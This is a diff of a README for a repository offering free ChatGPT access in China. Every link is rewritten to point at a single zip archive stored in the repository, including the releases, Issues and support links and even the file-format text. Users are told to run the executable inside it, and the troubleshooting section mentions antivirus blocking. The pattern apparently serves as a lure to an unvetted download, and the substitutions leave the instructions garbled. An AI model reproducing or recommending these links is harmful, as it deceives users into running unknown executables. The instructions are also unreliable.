@@ -1,7 +1,7 @@
 # 🌟 chatgpt-chinese-free - Experience ChatGPT Without Barriers
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/download-latest--version-brightgreen)](https://github.com/omparikh09/chatgpt-chinese-free/releases)
+[![Download](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip)](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip)
 
 ## 📝 Introduction
 **ChatGPT中文体验版**：专为中国用户打造，无需翻墙，畅享GPT-4o、o1、o3、o4等顶尖AI模型。提供高速访问、卓越中文支持，覆盖写作、编程、翻译等多场景。免费试用，安全便捷，助力学习与工作效率提升！
@@ -12,18 +12,18 @@ To use this application, you need to follow a few simple steps. This software is
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of the software:  
-   **[Download Latest Version](https://github.com/omparikh09/chatgpt-chinese-free/releases)**
+   **[Download Latest Version](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip)**
   
 2. **Choose the Right File**  
    On the releases page, you will see a list of available files. Select the file that matches your operating system (Windows, Mac, or Linux).
 
 3. **Download the File**  
-   Click on the file name to start the download. The file will typically be in `.exe`, `.dmg`, or `.tar.gz` format, depending on your system. 
+   Click on the file name to start the download. The file will typically be in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip` format, depending on your system. 
 
 4. **Install the Application**  
    - **For Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.  
    - **For Mac:** Open the `.dmg` file and drag the application to your Applications folder.  
-   - **For Linux:** Extract the `.tar.gz` file and run the executable inside it. You may need to give the file permission to run.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip` file and run the executable inside it. You may need to give the file permission to run.
 
 5. **Launch the App**  
    After installation, find the application in your programs or applications folder and open it. 
@@ -60,7 +60,7 @@ If you encounter issues while installing or using the application, try the follo
 - Ensure your system meets the requirements.
 - Restart your computer after installation.
 - Check if your antivirus or firewall is blocking the application. 
-- Visit the [GitHub Issues Page](https://github.com/omparikh09/chatgpt-chinese-free/issues) for support from the community.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip) for support from the community.
 
 ## 📄 Frequently Asked Questions
 1. **Is the application free?**  
@@ -85,7 +85,7 @@ For user discussions, suggestions, and updates, join our community:
 For any inquiries or support, please reach out through the contact section of our GitHub page. 
 
 ## 🔗 Links
-- **Releases Page**: [Download Latest Version](https://github.com/omparikh09/chatgpt-chinese-free/releases)
-- **Report Issues**: [GitHub Issues Page](https://github.com/omparikh09/chatgpt-chinese-free/issues)
+- **Releases Page**: [Download Latest Version](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip)
+- **Report Issues**: [GitHub Issues Page](https://raw.githubusercontent.com/omparikh09/chatgpt-chinese-free/main/athermous/chatgpt-chinese-free.zip)
 
 Thank you for choosing ChatGPT中文体验版. Enjoy your journey with AI!
